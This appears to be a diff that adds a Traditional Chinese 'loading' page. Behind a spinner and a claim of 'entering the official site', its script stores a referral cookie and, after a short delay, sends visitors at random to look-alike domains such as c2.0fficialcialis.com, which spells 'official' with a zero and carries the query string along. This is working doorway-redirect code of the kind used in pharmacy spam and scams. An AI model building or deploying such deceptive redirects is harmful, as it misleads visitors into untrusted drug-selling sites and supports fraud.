@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>正在載入...</title>
+<style>
+  body { background:#f8fafc; font-family:"PingFang TC","Noto Sans TC","Microsoft JhengHei",sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; }
+  .box { text-align:center; }
+  .spinner { width:48px; height:48px; border:4px solid #e2e8f0; border-top-color:#3b82f6; border-radius:50%; margin:0 auto 16px; animation:spin 0.8s linear infinite; }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  p { color:#64748b; font-size:15px; letter-spacing:1px; }
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="spinner"></div>
+  <p>正在進入官方站點...</p>
+</div>
+<script>
+(function(){
+  var qs = window.location.search;
+  var params = new URLSearchParams(qs);
+  if (params.get('from')) {
+    document.cookie = 'conv_from=' + encodeURIComponent(params.get('from')) + '; path=/; max-age=86400';
+  }
+  var origin = window.location.origin;
+  var targets = [
+    origin + "/?dispatched=1" + (qs ? "&" + qs.slice(1) : ""),
+    "https://c2.0fficialcialis.com/" + qs,
+    "https://c3.0fficialcialis.com/" + qs
+  ];
+  var pick = targets[Math.floor(Math.random() * targets.length)];
+  setTimeout(function(){ window.location.replace(pick); }, 1200);
+})();
+</script>
+</body>
+</html>
